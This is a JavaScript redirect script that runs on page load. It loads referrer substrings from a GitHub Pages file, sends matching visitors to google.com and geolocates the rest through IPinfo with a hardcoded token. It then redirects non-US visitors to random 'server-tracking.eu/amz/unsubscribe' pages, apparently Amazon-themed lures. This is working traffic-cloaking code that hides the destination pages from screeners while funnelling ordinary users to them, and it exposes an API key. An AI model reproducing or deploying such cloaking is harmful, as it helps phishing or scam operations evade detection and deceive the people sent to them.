// Static redirect URL for all matching substrings
const staticRedirectUrl = "https://www.google.com";

// List of URLs
const urls = [
    "https://server-tracking.eu/amz/unsubscribe-012024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-022024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-05.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-052024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-052024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-062024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-072024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-122023-01.html",
    "https://server-tracking.eu/amz/unsubscribe-112024-01.html"
];

// Function to handle redirection
function redirectToRandomUrl(substrings) {
    const referrer = document.referrer;
    console.log('Referrer:', referrer);  // Print the referrer for debugging

    // If referrer is empty, do nothing and return
    if (!referrer) {
        console.log('No referrer found, not redirecting.');
        return; // Exit the function if no referrer is found
    }

    // Check if the referrer contains any of the substrings
    if (substrings.some(substring => referrer.includes(substring))) {
        console.log(`Redirecting visitor from referrer ${referrer} to ${staticRedirectUrl}`);
        window.location.href = staticRedirectUrl;
        return;
    }

    // Fetch IP info from IPinfo
    const apiKey = '3a709c1d687b13';  // Replace with your IPinfo API key
    const apiUrl = `https://ipinfo.io/json?token=${apiKey}`;

    fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            console.log('IP Info:', data);  // Log the IP info for debugging

            // Example: Check country from IPinfo data
            if (data.country === 'US') {
                console.log('User is from the United States');
                // Redirect to a specific URL for US users (optional)
                window.location.href = 'https://specific-us-url.com';
                return;
            } else {
                console.log('User is not from the US');
            }

            // Redirect to a random URL if no substring match and no special case for country
            const randomIndex = Math.floor(Math.random() * urls.length);
            const randomUrl = urls[randomIndex];

            console.log(`Redirecting to: ${randomUrl}`);
            window.location.href = randomUrl;
        })
        .catch(error => {
            console.error('Error fetching IP info:', error);
            // Fallback if the API fails, redirect to random URL
            const randomIndex = Math.floor(Math.random() * urls.length);
            const randomUrl = urls[randomIndex];

            console.log(`Error with IPinfo. Redirecting to random URL: ${randomUrl}`);
            window.location.href = randomUrl;
        });
}

// Load substrings from JSON file and execute redirection
fetch('https://hellonetwork2023.github.io/sc/substrings.json')
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        const substrings = data.substrings || [];
        console.log('Loaded substrings:', substrings);

        // Execute the redirection logic with loaded substrings
        redirectToRandomUrl(substrings);
    })
    .catch(error => {
        console.error('Error loading substrings:', error);

        // Fallback to random redirection if substrings fail to load
        redirectToRandomUrl([]);
    });
